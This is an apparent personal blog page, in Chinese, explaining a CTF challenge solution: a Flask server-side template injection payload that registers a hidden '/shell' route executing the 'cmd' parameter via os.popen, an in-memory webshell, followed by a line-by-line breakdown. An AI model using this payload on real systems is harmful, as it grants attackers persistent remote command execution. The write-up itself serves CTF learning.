@@ -1,0 +1,172 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内存马 | blogs</title><meta name="author" content="C1ves"><meta name="copyright" content="C1ves"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="今天复现shctf的love_flask题目的时候看到的。   这道题是个无回显的ssti，给了两种解，一种是延时爆flag，一种用到了内存马，文章贴在下面。   https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD我们分析一下它的payload   1{{url_for.__g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马">
+<meta property="og:url" content="https://c1ves.github.io/2024/10/29/Memory_Horse/index.html">
+<meta property="og:site_name" content="blogs">
+<meta property="og:description" content="今天复现shctf的love_flask题目的时候看到的。   这道题是个无回显的ssti，给了两种解，一种是延时爆flag，一种用到了内存马，文章贴在下面。   https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD我们分析一下它的payload   1{{url_for.__g">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://c1ves.github.io/image/%E5%A4%B4%E5%83%8F.jpg">
+<meta property="article:published_time" content="2024-10-29T15:48:55.000Z">
+<meta property="article:modified_time" content="2025-07-24T00:46:28.685Z">
+<meta property="article:author" content="C1ves">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c1ves.github.io/image/%E5%A4%B4%E5%83%8F.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内存马",
+  "url": "https://c1ves.github.io/2024/10/29/Memory_Horse/",
+  "image": "https://c1ves.github.io/image/%E5%A4%B4%E5%83%8F.jpg",
+  "datePublished": "2024-10-29T15:48:55.000Z",
+  "dateModified": "2025-07-24T00:46:28.685Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "C1ves",
+      "url": "https://c1ves.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://c1ves.github.io/2024/10/29/Memory_Horse/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内存马',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/image/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">blogs</span></a><a class="nav-page-title" href="/"><span class="site-name">内存马</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-29T15:48:55.000Z" title="Created 2024-10-29 23:48:55">2024-10-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-24T00:46:28.685Z" title="Updated 2025-07-24 08:46:28">2025-07-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>今天复现shctf的love_flask题目的时候看到的。  </p>
+<p>这道题是个无回显的ssti，给了两种解，一种是延时爆flag，一种用到了内存马，文章贴在下面。  </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a><br>我们分析一下它的payload  </p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span>,{<span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],<span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]})}}</span><br></pre></td></tr></tbody></table></figure>
+<p>app.add_url_rule(‘/shell’, ‘shell’, lambda :<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read())：  </p>
+<p>app.add_url_rule：向 Flask 应用程序添加一个新的路由规则。  </p>
+<p>第一个参数’/shell’是路由的URL。<br>第二个参数’shell’是视图函数的端点名称。<br>第三个参数是一个匿名函数（lambda），当访问/shell路由时，会执行这个函数。  </p>
+<p><code>__import__('os').popen</code>：动态导入os模块，并调用popen方法执行命令。  </p>
+<p><code>_request_ctx_stack.top.request.args.get('cmd', 'whoami')</code>：获取请求中的cmd参数，如果没有提供，则默认为’whoami’。  </p>
+<p>执行环境字典：<br><code>{ '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'], 'app':url_for.__globals__['current_app'] }</code>：<br>为 eval 函数提供执行环境，其中包含 _request_ctx_stack 和 app 两个变量。<br>_request_ctx_stack 是 Flask 中的一个栈，用于存储请求上下文。<br>current_app 是 Flask 中的当前应用实例。  </p>
+<p>真的得恶补python了（反序列化和flask优先吧）  </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://c1ves.github.io">C1ves</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://c1ves.github.io/2024/10/29/Memory_Horse/">https://c1ves.github.io/2024/10/29/Memory_Horse/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/%E5%A4%B4%E5%83%8F.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/23/yunjing-initial/" title="春秋云境——initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">春秋云境——initial</div></div><div class="info-2"><div class="info-item-1">flag01（外网）fscan扫描目录发现存在thinkphp漏洞   123456789101112131415161718sudo ./fscan -h 39.99.144.204[sudo] kali 的密码：   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.99.144.204:22 open39.99.144.204:80 open[*] alive ports len is: 2start vulscan[*] WebTitle http://39.99.144.204 ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">C1ves</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C1ves"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/yunjing-initial/" title="春秋云境——initial">春秋云境——initial</a><time datetime="2025-07-23T10:09:02.000Z" title="Created 2025-07-23 18:09:02">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/29/Memory_Horse/" title="内存马">内存马</a><time datetime="2024-10-29T15:48:55.000Z" title="Created 2024-10-29 23:48:55">2024-10-29</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 By C1ves</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
